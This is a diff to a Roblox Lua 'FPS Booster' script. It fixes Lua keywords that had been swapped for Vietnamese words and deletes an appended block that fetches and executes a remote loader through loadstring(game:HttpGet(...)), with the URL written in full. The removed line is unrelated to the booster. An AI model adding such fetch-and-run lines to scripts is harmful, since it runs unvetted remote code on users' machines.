@@ -76,7 +76,7 @@ local ME, CanBeEnabled = Players.LocalPlayer, {"ParticleEmitter", "Trail", "Smok
 
 local function PartOfCharacter(Instance)
     for i, v in pairs(Players:GetPlayers()) do
-        if v ~= ME và v.Character and Instance:IsDescendantOf(v.Character) then
+        if v ~= ME and v.Character and Instance:IsDescendantOf(v.Character) then
             return true
         end
     end
@@ -167,7 +167,7 @@ local function CheckIfBad(Instance)
                 Instance:Destroy()
             end
         elseif Instance:IsA("Model") then
-            if _G.Settings["Low Quality Models"] hoặc (_G.Settings.Other and _G.Settings.Other["Low Quality Models"]) then
+            if _G.Settings["Low Quality Models"] or (_G.Settings.Other and _G.Settings.Other["Low Quality Models"]) then
                 Instance.LevelOfDetail = 1
             end
         elseif Instance:IsA("MeshPart") then
@@ -303,7 +303,3 @@ end
 if _G.ConsoleLogs then
     warn("FPS Booster is now activated!")
 end
-
--- Mở script getgenv().Team = "Marines"
-getgenv().Team = "Marines"
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
